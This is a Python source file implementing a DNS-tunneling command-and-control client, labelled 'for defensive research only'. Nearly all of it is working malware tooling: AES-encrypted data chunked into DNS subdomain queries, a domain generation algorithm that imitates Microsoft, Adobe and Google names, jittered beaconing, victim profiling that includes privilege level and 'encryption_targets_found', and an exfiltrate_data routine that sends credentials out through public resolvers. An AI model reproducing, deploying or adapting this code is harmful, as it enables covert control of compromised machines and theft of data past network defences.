#!/usr/bin/env python3
"""
Advanced DNS Tunneling C&C Implementation
High-performance covert channel for command and control
For defensive cybersecurity research purposes only
"""

import dns.resolver
import dns.message
import dns.query
import dns.name
import base64
import zlib
import json
import time
import random
import threading
import hashlib
import hmac
import struct
from typing import Dict, List, Optional, Tuple
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import socket
import requests


class AdvancedDNSTunnel:
    def __init__(self, c2_domain: str, dns_servers: List[str], encryption_key: bytes):
        self.c2_domain = c2_domain
        self.dns_servers = dns_servers
        self.encryption_key = encryption_key
        self.session_id = self._generate_session_id()
        self.sequence_number = 0
        self.chunk_size = 28  # DNS label limit minus overhead
        self.max_retries = 5
        self.jitter_range = (1, 5)  # Random delay range in seconds
        
        # Domain generation algorithm parameters
        self.dga_seed = "malware_campaign_2024_v3"
        self.backup_domains = self._generate_backup_domains(10)
        
        print(f"[+] DNS Tunnel initialized")
        print(f"[+] Primary domain: {self.c2_domain}")
        print(f"[+] Session ID: {self.session_id}")
    
    def _generate_session_id(self) -> str:
        """Generate unique session identifier"""
        timestamp = int(time.time())
        random_bytes = get_random_bytes(4)
        session_hash = hashlib.md5(f"{timestamp}{random_bytes.hex()}".encode()).hexdigest()[:8]
        return session_hash
    
    def _generate_backup_domains(self, count: int) -> List[str]:
        """Generate backup domains using DGA"""
        domains = []
        current_seed = hashlib.md5(self.dga_seed.encode()).digest()
        
        tlds = ['.com', '.net', '.org', '.info', '.biz', '.co']
        domain_words = ['security', 'update', 'service', 'system', 'windows', 'microsoft', 
                       'adobe', 'google', 'cdn', 'cache', 'api', 'cloud']
        
        for i in range(count):
            # Generate pseudo-random domain
            hash_input = current_seed + struct.pack('<I', i)
            domain_hash = hashlib.sha256(hash_input).digest()
            
            # Select components based on hash
            word1_idx = struct.unpack('<H', domain_hash[:2])[0] % len(domain_words)
            word2_idx = struct.unpack('<H', domain_hash[2:4])[0] % len(domain_words)
            tld_idx = struct.unpack('<B', domain_hash[4:5])[0] % len(tlds)
            suffix = struct.unpack('<H', domain_hash[5:7])[0] % 1000
            
            domain = f"{domain_words[word1_idx]}-{domain_words[word2_idx]}-{suffix:03d}{tlds[tld_idx]}"
            domains.append(domain)
        
        return domains
    
    def _encrypt_data(self, data: bytes) -> bytes:
        """Encrypt data for transmission"""
        iv = get_random_bytes(16)
        cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
        padded_data = pad(data, AES.block_size)
        ciphertext = cipher.encrypt(padded_data)
        
        # Add HMAC for integrity
        hmac_key = hashlib.pbkdf2_hmac('sha256', self.encryption_key, b'HMAC_SALT', 10000, 32)
        mac = hmac.new(hmac_key, iv + ciphertext, hashlib.sha256).digest()
        
        return iv + mac[:16] + ciphertext
    
    def _decrypt_data(self, encrypted_data: bytes) -> Optional[bytes]:
        """Decrypt received data"""
        if len(encrypted_data) < 32:
            return None
        
        iv = encrypted_data[:16]
        received_mac = encrypted_data[16:32]
        ciphertext = encrypted_data[32:]
        
        # Verify HMAC
        hmac_key = hashlib.pbkdf2_hmac('sha256', self.encryption_key, b'HMAC_SALT', 10000, 32)
        expected_mac = hmac.new(hmac_key, iv + ciphertext, hashlib.sha256).digest()[:16]
        
        if not hmac.compare_digest(received_mac, expected_mac):
            return None
        
        try:
            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
            padded_data = cipher.decrypt(ciphertext)
            return unpad(padded_data, AES.block_size)
        except:
            return None
    
    def _encode_dns_data(self, data: bytes) -> str:
        """Encode data for DNS transmission"""
        # Compress data first
        compressed = zlib.compress(data, level=9)
        
        # Base32 encoding (DNS-safe)
        encoded = base64.b32encode(compressed).decode().lower().rstrip('=')
        
        return encoded
    
    def _decode_dns_data(self, encoded: str) -> Optional[bytes]:
        """Decode data from DNS response"""
        try:
            # Add padding if necessary
            missing_padding = 8 - (len(encoded) % 8)
            if missing_padding != 8:
                encoded += '=' * missing_padding
            
            compressed = base64.b32decode(encoded.upper())
            return zlib.decompress(compressed)
        except:
            return None
    
    def _create_dns_query(self, data: bytes) -> List[str]:
        """Create DNS queries for data transmission"""
        encrypted_data = self._encrypt_data(data)
        encoded_data = self._encode_dns_data(encrypted_data)
        
        # Split into DNS-safe chunks
        chunks = []
        chunk_id = 0
        total_chunks = (len(encoded_data) + self.chunk_size - 1) // self.chunk_size
        
        for i in range(0, len(encoded_data), self.chunk_size):
            chunk = encoded_data[i:i + self.chunk_size]
            
            # Create subdomain with metadata
            metadata = f"{self.session_id}.{chunk_id:04x}.{total_chunks:04x}.{self.sequence_number:08x}"
            full_subdomain = f"{chunk}.{metadata}.{self.c2_domain}"
            chunks.append(full_subdomain)
            chunk_id += 1
        
        self.sequence_number += 1
        return chunks
    
    def _perform_dns_query(self, domain: str, query_type: str = 'TXT') -> Optional[str]:
        """Perform DNS query with fallback servers"""
        for dns_server in self.dns_servers:
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [dns_server]
                resolver.timeout = 10
                resolver.lifetime = 30
                
                if query_type == 'TXT':
                    response = resolver.resolve(domain, 'TXT')
                    return str(response[0]).strip('"')
                elif query_type == 'A':
                    response = resolver.resolve(domain, 'A')
                    return str(response[0])
                elif query_type == 'CNAME':
                    response = resolver.resolve(domain, 'CNAME')
                    return str(response[0])
                    
            except Exception as e:
                print(f"[!] DNS query failed for {dns_server}: {e}")
                continue
        
        return None
    
    def send_command_request(self, victim_info: Dict) -> Optional[Dict]:
        """Send victim information and request commands"""
        try:
            # Prepare victim data
            victim_data = {
                'session_id': self.session_id,
                'timestamp': int(time.time()),
                'victim_info': victim_info,
                'request_type': 'command_request'
            }
            
            serialized_data = json.dumps(victim_data).encode('utf-8')
            
            # Create DNS queries
            dns_queries = self._create_dns_query(serialized_data)
            
            # Send queries with jitter
            for query in dns_queries:
                response = self._perform_dns_query(query, 'TXT')
                if response:
                    print(f"[+] DNS response received: {response[:50]}...")
                
                # Add random jitter
                jitter = random.uniform(*self.jitter_range)
                time.sleep(jitter)
            
            # Query for command response
            return self._get_command_response()
            
        except Exception as e:
            print(f"[-] Failed to send command request: {e}")
            return None
    
    def _get_command_response(self) -> Optional[Dict]:
        """Retrieve command from C&C server"""
        try:
            # Query specific subdomain for commands
            command_domain = f"cmd.{self.session_id}.{self.c2_domain}"
            
            # Try multiple query types
            for query_type in ['TXT', 'CNAME', 'A']:
                response = self._perform_dns_query(command_domain, query_type)
                if response and len(response) > 10:  # Valid response threshold
                    
                    if query_type == 'A':
                        # Decode IP address to data
                        response = self._decode_ip_response(response)
                    
                    decoded_data = self._decode_dns_data(response)
                    if decoded_data:
                        decrypted_data = self._decrypt_data(decoded_data)
                        if decrypted_data:
                            try:
                                return json.loads(decrypted_data.decode('utf-8'))
                            except:
                                pass
            
            return None
            
        except Exception as e:
            print(f"[-] Failed to get command response: {e}")
            return None
    
    def _decode_ip_response(self, ip_address: str) -> str:
        """Decode data from IP address response"""
        try:
            octets = ip_address.split('.')
            if len(octets) != 4:
                return ""
            
            # Convert octets to encoded string
            encoded_chars = []
            for octet in octets:
                if 32 <= int(octet) <= 126:  # Printable ASCII
                    encoded_chars.append(chr(int(octet)))
            
            return ''.join(encoded_chars)
        except:
            return ""
    
    def exfiltrate_data(self, data: bytes, data_type: str = "general") -> bool:
        """Exfiltrate sensitive data via DNS"""
        try:
            # Prepare exfiltration packet
            exfil_data = {
                'session_id': self.session_id,
                'timestamp': int(time.time()),
                'data_type': data_type,
                'data_size': len(data),
                'data': base64.b64encode(data).decode('ascii')
            }
            
            serialized_data = json.dumps(exfil_data).encode('utf-8')
            
            # Split large data into multiple transmissions
            max_size = 1024  # Maximum size per transmission
            offset = 0
            part = 0
            
            while offset < len(serialized_data):
                chunk = serialized_data[offset:offset + max_size]
                
                # Add part information
                part_info = {
                    'part': part,
                    'total_parts': (len(serialized_data) + max_size - 1) // max_size,
                    'chunk': base64.b64encode(chunk).decode('ascii')
                }
                
                # Create DNS queries for this part
                dns_queries = self._create_dns_query(json.dumps(part_info).encode('utf-8'))
                
                # Send with retries
                success = False
                for retry in range(self.max_retries):
                    try:
                        for query in dns_queries:
                            self._perform_dns_query(query, 'TXT')
                        success = True
                        break
                    except:
                        time.sleep(2 ** retry)  # Exponential backoff
                
                if not success:
                    print(f"[-] Failed to exfiltrate part {part}")
                    return False
                
                offset += max_size
                part += 1
                
                # Rate limiting
                time.sleep(random.uniform(2, 8))
            
            print(f"[+] Successfully exfiltrated {len(data)} bytes via DNS")
            return True
            
        except Exception as e:
            print(f"[-] Data exfiltration failed: {e}")
            return False
    
    def heartbeat(self) -> bool:
        """Send heartbeat to maintain C&C connection"""
        try:
            heartbeat_data = {
                'session_id': self.session_id,
                'timestamp': int(time.time()),
                'request_type': 'heartbeat',
                'status': 'active'
            }
            
            serialized_data = json.dumps(heartbeat_data).encode('utf-8')
            dns_queries = self._create_dns_query(serialized_data)
            
            # Send heartbeat query
            for query in dns_queries[:1]:  # Only send first chunk for heartbeat
                response = self._perform_dns_query(query, 'TXT')
                if response:
                    return True
            
            return False
            
        except Exception as e:
            print(f"[-] Heartbeat failed: {e}")
            return False
    
    def test_connectivity(self) -> bool:
        """Test DNS tunnel connectivity"""
        print("[+] Testing DNS tunnel connectivity...")
        
        # Test primary domain
        test_domain = f"test.{self.session_id}.{self.c2_domain}"
        response = self._perform_dns_query(test_domain, 'TXT')
        
        if response:
            print(f"[+] Primary domain responsive: {self.c2_domain}")
            return True
        
        # Test backup domains
        for backup_domain in self.backup_domains[:3]:  # Test first 3 backups
            test_domain = f"test.{self.session_id}.{backup_domain}"
            response = self._perform_dns_query(test_domain, 'TXT')
            if response:
                print(f"[+] Backup domain responsive: {backup_domain}")
                self.c2_domain = backup_domain  # Switch to working domain
                return True
        
        print("[-] No responsive domains found")
        return False


class DNSServerMimic:
    """Simple DNS server for research/testing purposes"""
    
    def __init__(self, listen_port: int = 5353):
        self.listen_port = listen_port
        self.running = False
        
    def start_server(self):
        """Start DNS server for testing"""
        self.running = True
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('127.0.0.1', self.listen_port))
        
        print(f"[+] DNS server listening on port {self.listen_port}")
        
        while self.running:
            try:
                data, addr = sock.recvfrom(512)
                response = self._process_dns_query(data)
                if response:
                    sock.sendto(response, addr)
            except:
                pass
        
        sock.close()
    
    def _process_dns_query(self, query_data: bytes) -> Optional[bytes]:
        """Process incoming DNS query"""
        try:
            # Parse DNS query
            query = dns.message.from_wire(query_data)
            
            # Create response
            response = dns.message.make_response(query)
            
            # Add fake TXT record
            fake_response = "ZGF0YXBheWxvYWQ="  # Base64 encoded fake data
            txt_record = dns.rrset.from_text(
                query.question[0].name,
                300,  # TTL
                'IN',
                'TXT',
                f'"{fake_response}"'
            )
            response.answer.append(txt_record)
            
            return response.to_wire()
            
        except Exception as e:
            print(f"[!] DNS query processing error: {e}")
            return None


# Example usage for defensive research
if __name__ == "__main__":
    # Configuration for research testing
    c2_domain = "research-c2-server.local"
    dns_servers = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]
    encryption_key = hashlib.sha256(b"research_encryption_key_2024").digest()
    
    # Initialize DNS tunnel
    tunnel = AdvancedDNSTunnel(c2_domain, dns_servers, encryption_key)
    
    # Test connectivity
    if tunnel.test_connectivity():
        print("[+] DNS tunnel operational")
        
        # Simulate victim information
        victim_info = {
            "hostname": "research-victim-01",
            "os": "Windows 11 Pro",
            "domain": "research.local",
            "ip_address": "192.168.1.100",
            "installed_av": "Windows Defender",
            "privilege_level": "admin",
            "network_shares": ["\\\\server\\shared"],
            "encryption_targets_found": 1250
        }
        
        # Send command request
        commands = tunnel.send_command_request(victim_info)
        if commands:
            print(f"[+] Received commands: {commands}")
        
        # Example data exfiltration
        sensitive_data = b"Research sample sensitive data for testing"
        tunnel.exfiltrate_data(sensitive_data, "credentials")
        
        # Send heartbeat
        tunnel.heartbeat()
        
    else:
        print("[-] DNS tunnel connectivity test failed")
    
    print("\n[!] This DNS tunnel implementation is for defensive research only!")
    print("[!] Use in controlled, authorized environments only!")
